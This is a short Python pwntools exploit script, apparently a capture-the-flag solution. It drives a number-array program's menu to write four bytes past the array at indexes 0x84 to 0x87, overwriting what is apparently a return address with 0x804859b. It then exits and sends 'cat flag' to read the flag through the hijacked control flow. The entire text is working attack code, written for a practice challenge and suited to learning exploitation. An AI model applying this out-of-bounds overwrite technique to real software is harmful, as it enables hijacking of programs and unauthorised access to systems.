from parse_args_and_some_func import *
sh:tube = all_parsed_args['io']
context.update(arch='i386', os='linux', endian='little')
target_addr = 0x804859b
sh.sendlineafter("How many numbers you have:\n", '4')
sh.sendlineafter("Give me your numbers\n", '97')
sh.sendline('97')
sh.sendline('97')
sh.sendline('97')

sh.sendlineafter("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit\n", "3")
sh.sendlineafter("which number to change:\n", str(0x84))
sh.sendlineafter("new number:\n", str(target_addr & 0xff))

sh.sendlineafter("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit\n", "3")
sh.sendlineafter("which number to change:\n", str(0x85))
sh.sendlineafter("new number:\n", str((target_addr >> 8) & 0xff))

sh.sendlineafter("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit\n", "3")
sh.sendlineafter("which number to change:\n", str(0x86))
sh.sendlineafter("new number:\n", str((target_addr >> 16) & 0xff))

sh.sendlineafter("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit\n", "3")
sh.sendlineafter("which number to change:\n", str(0x87))
sh.sendlineafter("new number:\n", str((target_addr >> 24) & 0xff))

sh.sendlineafter("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit\n", "5")

sleep(1)

sh.sendline('cat flag')

sh.interactive()
    